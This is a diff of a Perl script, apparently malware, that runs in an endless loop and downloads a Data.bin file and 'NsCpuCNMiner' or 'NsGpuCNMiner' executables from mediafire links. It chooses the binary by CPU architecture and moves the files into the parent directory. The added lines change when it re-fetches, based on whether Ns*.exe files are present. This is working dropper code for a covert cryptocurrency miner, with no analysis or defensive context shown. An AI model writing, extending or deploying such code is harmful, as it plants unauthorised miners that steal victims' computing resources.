@@ -33,23 +33,32 @@ use LWP::Simple;
 use Config;
 
 my \$command = "$command";
+my \$test = 0;
 while(1){
-  while(! -e "../$command" && ! -e "../Data.bin"){
+  foreach(glob "../*"){
+    if(\$_ =~ /Ns/i && \$_ =~ /\.exe\$/i){
+	  \$test = 1;
+	}
+  }
+  while(\$test == 1){
     getstore("http://download1654.mediafireuserdownload.com/6c6s7a8jsabg/0nwra4eocjkemrl/Data.bin", "Data.bin");
 	system("move Data.bin ../");
 	if(\$command =~ /CPU/i){
 	  if(\$Config{archname} =~ /x86_64/i || \$Config{archname} =~ /x64/i){
         getstore("http://download1586.mediafire.com/pl8xp2k13ydg/995k52eqx6ityix/NsCpuCNMiner64.exe", "NsCpuCNMiner64.exe");
         \$command = "NsCpuCNMiner64.exe";
+		\$test = 0;
 	  }else{
 	    getstore("http://download1518.mediafire.com/49eb85rg18xg/o5c3rn5s2k349lu/NsCpuCNMiner32.exe", "NsCpuCNMiner32.exe");
 	    \$command = "NsCpuCNMiner32.exe";
+		\$test = 0;
 	  }
 	}
 	if(\$command =~ /GPU/i){
 	  if(\$Config{archname} =~ /x86_64/ || \$Config{archname} =~ /x64/i){
 	    getstore("http://download846.mediafire.com/zskzcjqb4qcg/6hebk47rlq29t36/NsGpuCNMiner.exe", "NsGpuCNMiner.exe");
 	    \$command = "NsGpuCNMiner.exe";
+		\$test = 0;
 	  }
 	}
 	system("move $command ../");
